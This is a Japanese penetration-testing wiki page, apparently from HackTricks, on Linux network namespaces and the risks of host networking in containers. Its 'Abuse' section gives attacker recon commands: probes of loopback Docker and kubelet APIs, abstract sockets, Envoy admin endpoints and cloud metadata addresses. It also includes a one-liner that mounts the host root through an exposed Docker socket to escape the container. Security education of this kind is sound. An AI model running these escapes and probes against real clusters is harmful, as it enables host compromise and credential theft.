# ネットワーク namespace

{{#include ../../../../../banners/hacktricks-training.md}}

## 概要

ネットワーク namespace は、インターフェース、IP アドレス、ルーティングテーブル、ARP/neighbor state、ファイアウォールルール、ソケット、UNIX-domain abstract socket namespace、`/proc/net` のようなファイルの内容など、ネットワーク関連のリソースを分離します。これにより、コンテナはホストの実際のネットワークスタックを所有していなくても、独自の `eth0`、独自のローカルルート、独自の loopback デバイスを持っているように見えます。

セキュリティの観点では、これはネットワーク分離が単なるポートの bind よりもはるかに重要であることを意味します。private network namespace によって、workload が直接観察または再構成できる対象が制限されます。この namespace がホストと共有されると、コンテナは突然、ホストの listener、ホストローカルサービス、abstract AF_UNIX endpoint、そしてアプリケーションに公開される想定のなかったネットワーク制御ポイントを可視化できるようになります。

## 動作

新しく作成された network namespace は、インターフェースが接続されるまで、空またはほぼ空のネットワーク環境で開始します。その後、container runtime が virtual interface を作成または接続し、アドレスを割り当て、workload が想定どおり接続できるように route を設定します。bridge-based deployment では通常、コンテナには host bridge に接続された veth-backed interface が表示されます。Kubernetes では、CNI plugin が Pod networking に相当するセットアップを処理します。

このアーキテクチャから、`--network=host` や `hostNetwork: true` がなぜ非常に大きな変更となるのかが分かります。準備済みの private network stack を受け取る代わりに、workload はホストの実際のものに参加します。

## ラボ

次のコマンドで、ほぼ空の network namespace を確認できます。
```bash
sudo unshare --net --fork bash
ip addr
ip route
```
また、通常のコンテナとホストネットワークを使用するコンテナを次のように比較できます。
```bash
docker run --rm debian:stable-slim sh -c 'ip addr || ifconfig'
docker run --rm --network=host debian:stable-slim sh -c 'ss -lntp | head'
```
ホストネットワークを使用する container には、独自に分離された socket と interface のビューがなくなります。この変更だけでも、プロセスがどのような capabilities を持っているかを確認する前から、すでに重大な意味を持ちます。

## Runtime Usage

Docker と Podman は、別途設定されていない限り、通常は各 container 用に private network namespace を作成します。Kubernetes は通常、各 Pod に独自の network namespace を割り当てます。この namespace はその Pod 内の container 間で共有されますが、host とは分離されています。つまり、`127.0.0.1` は通常 container-local ではなく Pod-local です。ある container で localhost のみに bind された listener は、通常、その sidecar や sibling container から到達できます。Incus/LXC systems も、豊富な network-namespace ベースの isolation を提供しており、virtual networking の構成もより多様です。

共通する原則は、private networking がデフォルトの isolation boundary であり、host networking はその boundary から明示的に opt-out するものだということです。

## Misconfigurations

最も重要な misconfiguration は、単純に host network namespace を共有することです。これは performance、low-level monitoring、または利便性のために行われることがありますが、container で利用できる最も明確な boundary の一つを取り除きます。Host-local listener により直接的に到達できるようになり、localhost-only service にアクセスできる場合があります。また、`CAP_NET_ADMIN` や `CAP_NET_RAW` などの capabilities は、それらが有効にする操作が host 自身の network environment に適用されるため、より危険になります。

もう一つの問題は、network namespace が private であっても、network-related capabilities を過剰に付与することです。Private namespace は役に立ちますが、raw socket や高度な network control を harmless にするわけではありません。

Kubernetes では、`hostNetwork: true` によって、Pod-level network segmentation をどの程度信頼できるかも変わります。Kubernetes の documentation では、多くの network plugin が `hostNetwork` Pod の traffic を `podSelector` / `namespaceSelector` matching の対象として適切に区別できず、そのため通常の node traffic として扱うことが説明されています。Attacker の観点では、これは compromise された `hostNetwork` workload を、overlay-network workload と同じ policy assumptions によって制約された通常の Pod ではなく、node-level network foothold として扱うべき場合が多いことを意味します。

## Abuse

Isolation が弱い環境では、attackers は host の listening service を調査したり、loopback のみに bind された management endpoint に到達したり、正確な capabilities と environment に応じて traffic を sniff または interfere したりできます。また、`CAP_NET_ADMIN` が存在する場合は、routing や firewall state を reconfigure できる可能性もあります。Cluster 内では、これにより lateral movement や control-plane reconnaissance も容易になります。

Host networking が疑われる場合は、まず表示されている interface と listener が isolated container network ではなく host に属していることを確認します。
```bash
ip addr
ip route
ss -lntup | head -n 50
```
ループバック専用サービスは、最初に見つかる興味深い対象であることが多い：
```bash
ss -lntp | grep '127.0.0.1'
curl -s http://127.0.0.1:2375/version 2>/dev/null
curl -sk https://127.0.0.1:2376/version 2>/dev/null
```
抽象UNIXソケットは、TCP/UDPリスナーのようには見えず、`/run` 配下のファイルシステムパスとして存在しない場合もあるため、見落としやすい別のターゲットです。したがって、host-networked containerは、コンテナ内にbind-mountされていないホスト専用のcontrol channelへのアクセスを継承する可能性があります。
```bash
ss -xap 2>/dev/null | head -n 50
grep -a '@' /proc/net/unix 2>/dev/null | head -n 50
```
歴史的な例としては、`containerd-shim` の abstract socket exposure bug がありました。しかし、特定の CVE よりも重要な教訓は、workload が host network namespace に参加すると、abstract AF_UNIX services も攻撃対象領域の一部になるということです。それらの socket が runtime 関連または管理用に見える場合は、[Runtime API And Daemon Exposure](../../runtime-api-and-daemon-exposure.md) に pivot してください。

network capabilities が存在する場合、workload から可視化された stack を調査または変更できるかテストします。
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw'
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link show
```
最新の kernel では、host networking と `CAP_NET_ADMIN` により、単純な `iptables` / `nftables` の変更を超えて、packet path が公開される可能性もあります。`tc` の qdiscs と filters も namespace-scoped であるため、共有された host network namespace 内では、container から見える host interfaces に適用されます。さらに `CAP_BPF` も存在する場合、TC や XDP loaders などの network 関連 eBPF programs も関係してきます：
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw|cap_bpf'
for i in $(ls /sys/class/net 2>/dev/null); do
echo "== $i =="
tc qdisc show dev "$i" 2>/dev/null
tc filter show dev "$i" ingress 2>/dev/null
tc filter show dev "$i" egress 2>/dev/null
done
bpftool net 2>/dev/null
```
これは、攻撃者が firewall ルールを書き換えるだけでなく、host interface レベルで traffic を mirror、redirect、shape、drop できる可能性があるため重要です。private network namespace 内では、これらの操作は container から見える範囲に限定されますが、shared host namespace では host に影響を及ぼす操作になります。

cluster または cloud 環境では、host networking を利用している場合、metadata や control plane に隣接するサービスに対する迅速な local recon も正当化されます。
```bash
for u in \
http://169.254.169.254/latest/meta-data/ \
http://100.100.100.200/latest/meta-data/ \
http://127.0.0.1:10250/pods; do
curl -m 2 -s "$u" 2>/dev/null | head
done
```
Kubernetesでは、multi-container Pod内の**いずれか**のcontainerをcompromiseすると、同じPod内のsibling containerやsidecarが開いたlocalhost listenerにもアクセスできることを覚えておいてください。これは、Pod全体が1つのnetwork namespaceを共有しているためです。特に、service-mesh、observability、helper containerのadminまたはdebug interfaceが、cluster全体ではなく意図的にPod内部に限定されている場合に重要になります：
```bash
ss -lntup | grep -E '127.0.0.1|::1'
curl -s http://127.0.0.1:15000/server_info 2>/dev/null | head
curl -s http://127.0.0.1:15000/config_dump 2>/dev/null | head
```
「localhostにバインドされている」ものは**Pod-private**であり、**container-private**ではないと考えてください。Pod内の1つのcontainerがcompromiseされた後は、その前提は崩れます。

### Full Example: Host Networking + Local Runtime / Kubelet Access

Host networkingによって自動的にhost rootが得られるわけではありませんが、node自体からのみ意図的に到達可能なserviceが公開されることがよくあります。これらのserviceのいずれかの保護が弱い場合、host networkingは直接的なprivilege-escalation pathになります。

Docker API on localhost:
```bash
curl -s http://127.0.0.1:2375/version 2>/dev/null
docker -H tcp://127.0.0.1:2375 run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
localhost 上の Kubelet:
```bash
curl -k https://127.0.0.1:10250/pods 2>/dev/null | head
curl -k https://127.0.0.1:10250/runningpods/ 2>/dev/null | head
```
影響:

- 適切な保護なしにローカル runtime API が公開されている場合、ホストを直接侵害される可能性
- kubelet またはローカルエージェントに到達可能な場合、クラスタの偵察または横方向への移動
- `CAP_NET_ADMIN` と組み合わせた場合、トラフィックの操作または denial of service

## 確認

これらの確認の目的は、プロセスがプライベートな network stack を持っているか、どのルートと listener が可視か、そして capabilities をテストする前の段階ですでに network view がホストに近い状態に見えるかを把握することです。
```bash
readlink /proc/self/ns/net   # Current network namespace identifier
readlink /proc/1/ns/net      # Compare with PID 1 in the current container / pod
lsns -t net 2>/dev/null      # Reachable network namespaces from this view
ip netns identify $$ 2>/dev/null
ip addr                      # Visible interfaces and addresses
ip route                     # Routing table
ss -lntup                    # Listening TCP/UDP sockets with process info
ss -xap                      # UNIX sockets, including abstract namespace entries
grep -a '@' /proc/net/unix   # Quick view of abstract AF_UNIX sockets in this netns
```
ここで注目すべき点：

- `/proc/self/ns/net` と `/proc/1/ns/net` がすでにホストに似た状態に見える場合、container が host network namespace、または別の非private namespaceを共有している可能性があります。
- shellがすでに名前付きまたは永続的なnamespace内にあり、ホスト側の`/run/netns`オブジェクトとの対応関係を確認したい場合、`lsns -t net`と`ip netns identify`が役立ちます。
- `ss -lntup`は、loopback-only listenerやローカル管理エンドポイントを明らかにするため、特に有用です。`ss -xap`と`/proc/net/unix`を使うと、通常のfilesystem socketの探索では見落とすabstract socketの情報も確認できます。
- `CAP_NET_ADMIN`、`CAP_NET_RAW`、または`CAP_BPF`が存在する場合、route、interface名、firewallのcontext、`tc`の状態、eBPF attachmentがより重要になります。
- Kubernetesでは、`hostNetwork` Podからservice-name resolutionに失敗しても、serviceが存在しないのではなく、単にPodが`dnsPolicy: ClusterFirstWithHostNet`を使用していないだけかもしれません。
- multi-container Podでは、localhost listenerはPod全体のnetwork namespaceに属します。そのため、loopback-only portが侵害されたcontainerから到達不能だと判断する前に、sidecarとsibling containerを確認してください。

containerを調査する際は、必ずnetwork namespaceをcapability setと併せて評価してください。host networkingと強力なnetwork capabilitiesの組み合わせは、bridge networkingと限定的なdefault capability setの組み合わせとは、security postureが大きく異なります。

## 参考資料

- [Kubernetes NetworkPolicy and `hostNetwork` caveats](https://kubernetes.io/docs/concepts/services-networking/network-policies/)
- [Linux `network_namespaces(7)` and abstract UNIX socket isolation](https://man7.org/linux/man-pages/man7/network_namespaces.7.html)
- [containerd advisory: abstract Unix domain sockets exposed to host-network containers](https://github.com/containerd/containerd/security/advisories/GHSA-36xw-fx78-c5r4)
- [eBPF token and capability requirements for network-related eBPF programs](https://docs.ebpf.io/linux/concepts/token/)
{{#include ../../../../../banners/hacktricks-training.md}}
